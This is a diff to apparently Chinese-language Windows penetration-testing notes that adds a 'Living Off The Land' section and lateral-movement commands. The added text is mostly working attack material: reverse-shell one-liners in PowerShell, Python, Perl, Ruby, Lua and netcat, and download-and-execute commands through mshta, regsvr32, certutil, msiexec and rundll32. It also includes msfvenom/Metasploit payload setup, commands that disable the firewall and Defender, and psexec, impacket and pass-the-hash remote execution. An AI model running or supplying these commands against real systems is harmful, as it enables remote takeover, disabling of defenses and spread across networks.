@@ -10,6 +10,10 @@
 
 # 大纲
 
+* **[漏洞利用](#漏洞利用)**
+
+* **[LOL](#LOL)**
+
 * **[RDP](#rdp)**
     * [命令行开启RDP](#命令行开启rdp)
     * [多开](#多开)
@@ -37,8 +41,286 @@
 
 ---
 
-**漏洞记录**
+# 漏洞利用
+
 - [OS-Exploits](./OS-Exploits.md#Windows)
+
+---
+
+# LOL
+
+`Living Off The Land`
+
+**相关文章**
+- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
+- [What Are LOLBins and How Do Attackers Use Them in Fileless Attacks? - Cynet](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/)
+
+**相关资源**
+- [LOLBAS](https://lolbas-project.github.io/)
+
+**nc**
+```
+路径\nc.exe -l -p 端口 -t -e 路径\cmd.exe
+c:\RECYCLER\nc.exe -l -p 1234 -t -e c:\RECYCLER\cmd.exe
+```
+
+**powershell**
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+```powershell
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+```
+
+**perl**
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
+
+**python**
+```powershell
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+```
+
+**ruby**
+```ruby
+ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
+
+**lua**
+```powershell
+lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+```
+
+**Mshta.exe**
+
+Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。
+
+Metasploit 包含“ HTA Web服务器”模块，该模块会生成恶意的 hta 文件。该模块托管一个 HTML 应用程序（HTA），该应用程序在打开时将通过 Powershell 运行有效负载。当用户导航到 HTA 文件时，在 Payload 执行之前 IE 会提示两次。
+
+攻击端
+```bash
+use exploit/windows/misc/hta_server
+set srvhost 192.168.1.109
+set lhost 192.168.1.109
+exploit
+```
+
+目标端
+```
+mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
+```
+
+**Rundll32.exe**
+
+Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。
+
+Metasploit 还包含“ SMB Delivery”模块，该模块生成恶意的 dll 文件。该模块通过 SMB 服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持 DLL 和 Powershell。
+
+攻击端
+```bash
+use exploit/windows/smb/smb_delivery
+set srvhost 192.168.1.109
+set lhost 192.168.1.109
+exploit
+```
+
+目标端
+```cmd
+rundll32.exe \\192.168.1.109\vabFG\test.dll,0
+```
+
+**Regsvr32.exe**
+
+Regsvr32 是一个命令行实用程序，用于注册和注销 OLE 控件，例如 Windows 注册表中的 DLL 和 ActiveX 控件。Windows XP 和更高版本的 Windows 的 ％systemroot％\ System32 文件夹中安装了 Regsvr32.exe。
+
+Regsvr32使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载/执行）都可以在同一端口上发生。“PSH(Binary)”将向磁盘写入文件，允许下载/执行自定义二进制文件。
+
+攻击端
+```bash
+use exploit/multi/script/web_delivery
+set target 3
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set srvhost 192.168.1.109
+exploit
+```
+
+目标端
+```bash
+regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
+```
+
+**Certutil.exe**
+
+Certutil.exe 是作为证书服务的一部分安装的命令行程序。我们可以使用此工具在目标计算机上执行恶意 exe 文件，以获取 meterpreter 程序会话。
+
+攻击端
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
+python -m SimpleHTTPServer 80
+```
+```bash
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set lport 1234
+exploit
+```
+目标端
+```bash
+certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
+```
+
+**Powercat.exe**
+
+Powercat 是 PowerShell 的本机后门侦听器和 reverse shel，也称为 netcat 的修改版本，因为它集成了对生成的编码 Payload 的支持，msfvenom 可以做到这一点，并且还具有客户端到客户端的中继(Powercat 客户端的术语，允许连接两个单独的侦听器)。
+
+攻击端
+```bash
+git clone https://github.com/besimorhino/powercat.git
+cd powercat
+python -m SimpleHTTPServer 80
+
+nc -lvp 1234
+```
+目标端
+```bash
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
+```
+
+**Batch File**
+
+攻击端
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
+
+python -m SimpleHTTPServer 80
+
+nc -lvp 4444
+```
+
+目标端
+```bash
+powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+```
+
+**Cscript**
+
+攻击端
+```bash
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
+
+python -m SimpleHTTPServer 80
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set lport 1234
+exploit
+```
+
+目标端
+```bash
+powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+```
+
+**Msiexec.exe**
+
+msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：
+
+攻击端
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
+
+python -m SimpleHTTPServer 80
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.109
+set lport 1234
+exploit
+```
+
+目标端
+```bash
+msiexec /q /i http://192.168.1.109/1.msi
+```
+
+**msxsl.exe**
+
+msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过他，我们可以执行 JavaScript 进而执行系统命令。
+
+下载地址 : https://www.microsoft.com/en-us/download/details.aspx?id=21714
+
+msxsl.exe 需要接受两个文件，XML 及 XSL 文件，可以远程加载
+```
+msxsl http://192.168.1.1/1/demo.xml http://192.168.1.1/1/exec.xsl
+```
+
+demo.xml
+```xml
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
+<customers>
+<customer>
+<name>Microsoft</name>
+</customer>
+</customers>
+```
+
+exec.xsl
+```xml
+<?xml version='1.0'?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+
+<msxsl:script language="JScript" implements-prefix="user">
+   function xml(nodelist) {
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
+   return nodelist.nextNode().xml;
+
+   }
+</msxsl:script>
+<xsl:template match="/">
+   <xsl:value-of select="user:xml(.)"/>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+**pubprn.vbs**
+
+在 Windows 7 以上版本存在一个名为 PubPrn.vbs 的微软已签名 WSH 脚本，其位于`C:\Windows\System32\Printing_Admin_Scripts\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给 GetObject()
+
+```
+"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+```
+
+**conhost**
+```
+conhost calc.exe
+```
+
+**schtasks**
+```
+schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
+/sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
+schtasks /F /delete /tn foobar /S host                          ## 清除 schtasks
+```
+
+**SC**
+```
+sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    ## 新建服务,指向拷贝的木马路径
+sc \\host start foobar                                          ## 启动建立的服务
+sc \\host delete foobar                                         ## 完事后删除服务
+```
 
 ---
 
@@ -67,18 +349,18 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
     - [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)
 
 - 命令
-    - **dos 命令开启 3389 端口(开启 XP&2003 终端服务)**
+    - dos 命令开启 3389 端口(开启 XP&2003 终端服务)
         1. 方法一 : `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
 
         2. 方法二 : `REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`
 
-    - **WMIC 开启 3389**
+    - WMIC 开启 3389
 
         ```
         wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1
         ```
 
-    - **PowerShell 开启 RDP**
+    - PowerShell 开启 RDP
         1. Enable RDP : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
 
         2. Allow RDP in firewall : `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`
@@ -92,7 +374,7 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 
         2. Enable the firewall rule : `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
-    - **reg 开启**
+    - reg 开启
         ```
         Windows Registry Editor Version 5.00
         [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
@@ -104,23 +386,34 @@ REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\W
         regedit /s a.reg
         ```
 
-    - **更改终端端口为 2008(十六进制为:0x7d8)**
+    - 更改终端端口为 2008(十六进制为:0x7d8)
 
         1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
         2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`
 
-    - **查看 3389 端口是否更改**
+    - 查看 RDP 服务端口是否更改
 
         ```
         REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制
         ```
 
-    - **允许 3389 端口**
+    - 允许 3389 端口
         ```
         netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
         ```
 
-    - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:**
+    - 关闭防火墙
+        ```
+        netsh advfirewall set allprofiles state off
+
+        ```
+
+    - 关闭Denfnder
+        ```
+        net stop windefend
+        ```
+
+    - 取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:
 
         ```
         REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f
@@ -522,7 +815,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
     mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#pth)
 
 - **wmiexec**
-    - [Invoke-WMIExec](https://github.com/wsfengfan/Invoke-TheHash)
+    - [Invoke-WMIExec](https://github.com/Kevin-Robertson/Invoke-TheHash)
         ```
         Invoke-Module Invoke-TheHash.psd1
         Invoke-WMIExec -Target 192.168.3.21 -Domain workgroup -Username administrator -Hash ccef208c6485269c20db2cad21734fe7 -Command "calc.exe" -verbose
@@ -532,6 +825,55 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
         ```
         wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.3.21 "whoami"
         ```
+
+- **WMIC**
+    ```cmd
+    wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
+    ```
+
+- **PStools**
+    ```cmd
+    psexec.exe \\ip –accepteula -u username -p password program.exe
+    ```
+
+    ```
+    psexec \\ip -u user -p passwd cmd /c dir D:\
+    ```
+
+- **smbexec**
+    ```
+    copy execserver.exe \\host\c$\windows\
+    test.exe ip user password command netshare
+    ```
+
+- **impacket**
+    - 工具地址 : https://github.com/SecureAuthCorp/impacket
+        ```bash
+        git clone https://github.com/CoreSecurity/impacket.git
+        cd impacket/
+        python setup.py install
+        cd impacket/examples
+        ```
+        - **Psexec.py**
+
+            Psexec.py 允许你在远程 Windows 系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程 shell 命令（不需要安装任何客户端软件）。
+            ```
+            ./psexec.py test/Administrator:Abcd1234@192.168.1.100
+            ```
+
+        - **Wmiexec.py**
+
+            它会生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。你不需要在目标服务器
+            ```
+            ./wmiexec.py test/Administrator:Abcd1234@192.168.1.100
+            ```
+
+        - **Atexec.py**
+
+            通过 Task Scheduler 服务在目标系统上执行命令，并返回输出结果。
+            ```
+            ./atexec.py test/Administrator:Abcd1234@192.168.1.100 whoami
+            ```
 
 - **metasploit**
 
@@ -560,10 +902,9 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 - **CrackMapExec**
     - 工具地址 : https://github.com/byt3bl33d3r/CrackMapExec
-
-    ```
-    cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
-    ```
+        ```
+        cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
+        ```
 
 #### kb2871997
 
